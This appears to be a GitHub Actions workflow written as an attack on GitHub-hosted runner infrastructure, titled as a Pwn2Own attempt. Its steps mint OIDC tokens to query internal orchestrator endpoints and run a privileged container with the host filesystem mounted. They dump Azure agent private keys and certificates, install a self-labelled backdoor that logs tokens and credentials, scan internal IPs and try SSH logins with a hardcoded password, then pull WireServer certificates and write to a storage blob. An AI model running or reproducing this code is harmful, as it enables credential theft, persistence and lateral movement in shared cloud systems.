name: HC OIDC Primer v6 - SSH Pivot All Known IPs
on:
  workflow_dispatch:
  push:
    branches: [main]

permissions:
  id-token: write
  contents: read

jobs:
  pwn2own:
    runs-on: ubuntu-latest
    timeout-minutes: 55
    steps:
      - name: Step1 - HC JWT mint + all orchestrators
        run: |
          echo "=== STEP 1: HC OIDC JWT ==="
          HC_JWT=$(curl -sf \
            -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" \
            "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" \
            | jq -r .value)
          echo "HC_JWT_LEN=${#HC_JWT}"
          echo "$HC_JWT" | cut -d. -f2 | base64 -d 2>/dev/null | jq . 2>/dev/null || true
          
          for ORCH in iad-01 iad-02 eus-01 eus-02; do
            URL="https://hosted-compute-request-orchestrator-prod-${ORCH}.githubapp.com/vm/v1"
            echo "--- $ORCH /vms ---"
            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/vms" 2>&1 | head -5 || true
            echo "--- $ORCH /allocations ---"
            curl -sf -H "Authorization: Bearer $HC_JWT" "$URL/allocations" 2>&1 | head -5 || true
          done

      - name: Step2 - Privileged docker - full cert + HCA + SSH pivot all known IPs
        run: |
          echo "=== STEP 2: PRIVILEGED DOCKER ==="
          docker run --rm --privileged --pid=host --network=host \
            -v /:/host \
            alpine sh -c '
              apk add --no-cache openssh-client sshpass nmap 2>/dev/null | tail -3

              echo "=== RUNNER VM ID ==="
              curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" | grep -o '"'"'"name":"[^"]*"'"'"' | head -3
              ip addr show eth0 | grep "inet "

              echo ""
              echo "=== PRIMER LOG CHECK (local) ==="
              cat /host/tmp/hc_pwn*.log 2>/dev/null || echo "no primer log yet"

              echo ""
              echo "=== FULL TRANSPORT CERT ==="
              cat /host/var/lib/waagent/TransportCert.pem 2>/dev/null && \
              echo "=== FULL TRANSPORT PRIVATE KEY ===" && \
              cat /host/var/lib/waagent/TransportPrivate.pem 2>/dev/null || echo "cert NOT FOUND"

              echo ""
              echo "=== ALL WAAGENT PEMS ==="
              find /host/var/lib/waagent/ -name "*.pem" -o -name "*.key" -o -name "*.crt" 2>/dev/null | while read f; do
                echo "=== FILE: $f ==="; cat "$f" 2>/dev/null; echo
              done

              echo ""
              echo "=== HCA ENDPOINTS ==="
              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
                grep -E "(https://[a-z]|githubapp\.com|github\.com/api|management\.azure)" | sort -u | head -50

              echo ""
              echo "=== HCA TRUST/SUB PATTERNS ==="
              strings /host/opt/hca/hosted-compute-agent 2>/dev/null | \
                grep -iE "(sub|aud|iss|trusted|internal|enterprise|organization|repo:|claim)" | sort -u | head -30

              echo ""
              echo "=== PRIMER REDEPLOY v3 ==="
              cat > /host/opt/primer/primer << '"'"'BDOOR'"'"'
#!/bin/bash
LOG=/tmp/hc_pwn3.log
echo "=== PRIMER v3 FIRED $(date) PID=$$ ===" >> $LOG
hostname >> $LOG
id >> $LOG
env >> $LOG 2>&1
if [ -n "$ACTIONS_ID_TOKEN_REQUEST_TOKEN" ]; then
  HC_JWT=$(curl -sf -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api%3A%2F%2Fhosted-compute-ro" | jq -r .value)
  echo "HC_JWT=$HC_JWT" >> $LOG
  for orch in iad-01 iad-02 eus-01 eus-02; do
    echo "=== $orch vms ===" >> $LOG
    curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/vms" >> $LOG 2>&1
    echo "=== $orch alloc ===" >> $LOG
    curl -s -H "Authorization: Bearer $HC_JWT" "https://hosted-compute-request-orchestrator-prod-$orch.githubapp.com/vm/v1/allocations" >> $LOG 2>&1
  done
fi
cat /var/lib/waagent/TransportCert.pem >> $LOG 2>/dev/null
cat /var/lib/waagent/TransportPrivate.pem >> $LOG 2>/dev/null
cat /home/runner/.credentials_rsaparams >> $LOG 2>/dev/null
[ -x /opt/primer/primer.bak ] && exec /opt/primer/primer.bak "$@"
BDOOR
              chmod 777 /host/opt/primer/primer
              echo "BACKDOOR v3 DEPLOYED:"; ls -la /host/opt/primer/primer

              echo ""
              echo "=== SSH SCAN ALL KNOWN IPs ==="
              MY_IP=$(ip addr show eth0 | grep "inet " | awk "{print \$2}" | cut -d/ -f1)
              echo "MY IP: $MY_IP"
              
              KNOWN_IPS="10.1.0.1 10.1.0.2 10.1.0.52 10.1.0.169 10.1.1.1 10.1.1.2 10.1.1.22 10.1.1.128 10.1.1.180 10.1.0.254 10.1.1.254 10.1.2.1 10.1.3.1 10.1.4.1"
              
              for ip in $KNOWN_IPS; do
                if [ "$ip" = "$MY_IP" ]; then continue; fi
                if nc -z -w2 "$ip" 22 2>/dev/null; then
                  echo "SSH OPEN: $ip"
                  # Try SSH as runner with password
                  sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                    -o PreferredAuthentications=password \
                    runner@"$ip" \
                    "echo TARGET_IP=$ip; id; hostname; cat /etc/hostname; cat /tmp/hc_pwn*.log 2>/dev/null; env | grep -E '(ACTIONS_ID_TOKEN|ACTIONS_ORCH|HC_JWT|GITHUB)'" \
                    2>&1 || echo "SSH runner@$ip FAILED"
                  # Try as ubuntu
                  sshpass -p "Pwn2Own2026!" ssh -o StrictHostKeyChecking=no -o ConnectTimeout=5 \
                    -o PreferredAuthentications=password \
                    ubuntu@"$ip" "id; hostname; cat /tmp/hc_pwn*.log 2>/dev/null" 2>&1 || true
                else
                  echo "closed: $ip"
                fi
              done

              echo ""
              echo "=== BROAD NMAP (22 only) ==="
              nmap -T5 -p 22 --open -n 10.1.0.0/20 2>/dev/null | grep -E "^(Nmap|Host|[0-9])" | head -50 || true
            '

      - name: Step3 - WireServer + IMDS full + status blob write
        run: |
          echo "=== STEP 3: WIRESERVER + STATUS BLOB ==="
          docker run --rm --network=host alpine sh -c '
            echo "=== IMDS FULL ==="
            curl -sf -H "Metadata:true" "http://169.254.169.254/metadata/instance?api-version=2021-02-01"
            
            echo ""
            echo "=== WIRESERVER CERTS ==="
            curl -sf -H "x-ms-version: 2012-11-30" "http://168.63.129.16/machine?comp=certificates" | head -100

            echo ""
            echo "=== STATUS BLOB WRITE ==="
            curl -sf -X PUT \
              "https://md-hdd-xbp0hss0vtkw.z24.blob.storage.azure.net/\$system/EUN9HuOTbcswtM.37d54176-e4e3-4319-af04-2e21f9421967.status?sv=2018-03-28&sr=b&sk=system-1&sig=R8Z5GVl%2fZz1zl6x6IcDIebodbxNPb8a52WsYCfXDutc%3d&se=9999-01-01T00%3a00%3a00Z&sp=rw" \
              -H "x-ms-blob-type: BlockBlob" \
              -H "Content-Type: application/json" \
              -d "[{\"status\":{\"name\":\"pwn2own\",\"operation\":\"HC pivot\",\"status\":\"transitioning\",\"code\":0,\"formattedMessage\":{\"lang\":\"en-US\",\"message\":\"Pwn2Own 2026 HC orchestrator pivot\"}}}]" 2>&1
            echo "BLOB WRITE DONE"
          '
